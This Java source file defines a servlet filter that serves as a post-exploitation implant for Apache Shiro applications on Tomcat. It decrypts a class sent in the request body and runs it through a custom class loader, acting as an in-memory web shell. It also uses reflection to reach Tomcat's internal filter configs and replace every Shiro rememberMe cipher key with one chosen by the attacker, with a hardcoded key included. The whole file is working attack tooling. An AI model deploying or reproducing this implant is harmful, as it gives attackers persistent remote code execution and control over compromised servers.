package com.summersec.x;

import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.ResponseFacade;

import javax.crypto.Cipher;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletRequestWrapper;
import javax.servlet.ServletResponse;
import javax.servlet.ServletResponseWrapper;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Collections;
import java.util.HashMap;
import java.util.IdentityHashMap;
import java.util.Map;
import java.util.Set;

/**
 * 高风险模式：同时扫描 filterConfigs 与 ServletContext#getFilterRegistrations() 中的候选 Shiro Filter，
 * 对所有能定位到的 rememberMeManager 逐个修改密钥。
 */
public class ChangeShiroKeyFilter6 extends ClassLoader implements Filter {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String cs = "UTF-8";
    public String pwd = "FcoRsBKe9XB3zOHbxTG0Lw==";

    public ChangeShiroKeyFilter6() {
    }

    public ChangeShiroKeyFilter6(ClassLoader c) {
        super(c);
    }

    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void destroy() {
    }

    @Override
    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain filterChain) throws IOException, ServletException {
        HttpSession session = ((HttpServletRequest) req).getSession();
        Object lastRequest = req;
        Object lastResponse = resp;
        if (!(lastRequest instanceof RequestFacade)) {
            try {
                Method getRequest = ServletRequestWrapper.class.getMethod("getRequest");
                lastRequest = getRequest.invoke(req);
                while (!(lastRequest instanceof RequestFacade)) {
                    lastRequest = getRequest.invoke(lastRequest);
                }
            } catch (Exception ignored) {
            }
        }
        try {
            if (!(lastResponse instanceof ResponseFacade)) {
                Method getResponse = ServletResponseWrapper.class.getMethod("getResponse");
                lastResponse = getResponse.invoke(resp);
                while (!(lastResponse instanceof ResponseFacade)) {
                    lastResponse = getResponse.invoke(lastResponse);
                }
            }
        } catch (Exception ignored) {
        }

        Map obj = new HashMap();
        obj.put("request", lastRequest);
        obj.put("response", lastResponse);
        obj.put("session", session);

        try {
            session.putValue("u", this.pwd);
            Cipher c = Cipher.getInstance("AES");
            (new ChangeShiroKeyFilter6(this.getClass().getClassLoader())).g(c.doFinal(this.base64Decode(req.getReader().readLine()))).newInstance().equals(obj);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    private Object getStandardContext() throws Exception {
        org.apache.tomcat.util.threads.TaskThread thread = (org.apache.tomcat.util.threads.TaskThread) Thread.currentThread();
        Field field = thread.getClass().getSuperclass().getDeclaredField("contextClassLoader");
        field.setAccessible(true);
        Object obj = field.get(thread);
        field = obj.getClass().getSuperclass().getSuperclass().getDeclaredField("resources");
        field.setAccessible(true);
        obj = field.get(obj);
        field = obj.getClass().getDeclaredField("context");
        field.setAccessible(true);
        return field.get(obj);
    }

    private Object getRememberMeManagerFromFilter(Object filter) throws Exception {
        Field field = filter.getClass().getSuperclass().getDeclaredField("securityManager");
        field.setAccessible(true);
        Object securityManager = field.get(filter);
        field = securityManager.getClass().getSuperclass().getDeclaredField("rememberMeManager");
        field.setAccessible(true);
        return field.get(securityManager);
    }

    private boolean applyKeyToManager(Object manager) {
        try {
            Method setEncryptionCipherKey = manager.getClass().getSuperclass().getDeclaredMethod("setEncryptionCipherKey", byte[].class);
            Method setDecryptionCipherKey = manager.getClass().getSuperclass().getDeclaredMethod("setDecryptionCipherKey", byte[].class);
            byte[] bytes = this.base64Decode(this.pwd);
            setEncryptionCipherKey.invoke(manager, new Object[]{bytes});
            setDecryptionCipherKey.invoke(manager, new Object[]{bytes});
            return true;
        } catch (Throwable ignored) {
            return false;
        }
    }

    private int scanFilterConfigs(Set<Object> seenManagers) {
        int changed = 0;
        try {
            Object standardContext = getStandardContext();
            Field field = standardContext.getClass().getSuperclass().getDeclaredField("filterConfigs");
            field.setAccessible(true);
            Map<String, Object> objMap = (Map<String, Object>) field.get(standardContext);
            for (Map.Entry<String, Object> entry : objMap.entrySet()) {
                String key = entry.getKey();
                if (key == null || !key.toLowerCase().contains("shiro")) {
                    continue;
                }
                try {
                    Field filterField = entry.getValue().getClass().getDeclaredField("filter");
                    filterField.setAccessible(true);
                    Object filter = filterField.get(entry.getValue());
                    Object manager = getRememberMeManagerFromFilter(filter);
                    if (manager != null && seenManagers.add(manager) && applyKeyToManager(manager)) {
                        changed++;
                    }
                } catch (Throwable ignored) {
                }
            }
        } catch (Throwable ignored) {
        }
        return changed;
    }

    private int scanFilterRegistrations(Set<Object> seenManagers) {
        int changed = 0;
        try {
            ServletContext context = request.getServletContext();
            Map<String, ? extends javax.servlet.FilterRegistration> regs = context.getFilterRegistrations();
            for (Map.Entry<String, ? extends javax.servlet.FilterRegistration> entry : regs.entrySet()) {
                String key = entry.getKey();
                if (key == null || !key.toLowerCase().contains("shiro")) {
                    continue;
                }
                try {
                    Object reg = entry.getValue();
                    Field filterDefField = reg.getClass().getDeclaredField("filterDef");
                    filterDefField.setAccessible(true);
                    Object filterDef = filterDefField.get(reg);
                    Field filterField = filterDef.getClass().getDeclaredField("filter");
                    filterField.setAccessible(true);
                    Object filter = filterField.get(filterDef);
                    Object manager = getRememberMeManagerFromFilter(filter);
                    if (manager != null && seenManagers.add(manager) && applyKeyToManager(manager)) {
                        changed++;
                    }
                } catch (Throwable ignored) {
                }
            }
        } catch (Throwable ignored) {
        }
        return changed;
    }

    public String changeKeyAll() {
        Set<Object> seenManagers = Collections.newSetFromMap(new IdentityHashMap<Object, Boolean>());
        int changed = 0;
        changed += scanFilterConfigs(seenManagers);
        changed += scanFilterRegistrations(seenManagers);
        if (changed > 0) {
            return "change key ok (all candidates updated: " + changed + ")";
        }
        return "no shiro rememberMeManager matched";
    }

    public boolean equals(Object obj) {
        this.parseObj(obj);
        this.pwd = this.request.getHeader("p");
        StringBuffer output = new StringBuffer();
        String tagS = "->|";
        String tagE = "|<-";

        try {
            this.response.setContentType("text/html");
            this.request.setCharacterEncoding(this.cs);
            this.response.setCharacterEncoding(this.cs);
            output.append(this.changeKeyAll());
        } catch (Exception ex) {
            output.append(ex.getMessage());
        }

        try {
            this.response.getWriter().println(tagS + output + tagE);
            this.response.getWriter().println(this.pwd);
            this.response.getWriter().flush();
            this.response.getWriter().close();
        } catch (Exception ignored) {
        }
        return true;
    }

    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[]) obj;
            this.request = (HttpServletRequest) data[0];
            this.response = (HttpServletResponse) data[1];
        } else {
            try {
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                this.request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
                this.response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception ex) {
                if (obj instanceof HttpServletRequest) {
                    this.request = (HttpServletRequest) obj;
                    try {
                        Field req = this.request.getClass().getDeclaredField("request");
                        req.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest) req.get(this.request);
                        Field resp = request2.getClass().getDeclaredField("response");
                        resp.setAccessible(true);
                        this.response = (HttpServletResponse) resp.get(request2);
                    } catch (Exception ignored) {
                    }
                }
            }
        }
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception ex) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
}
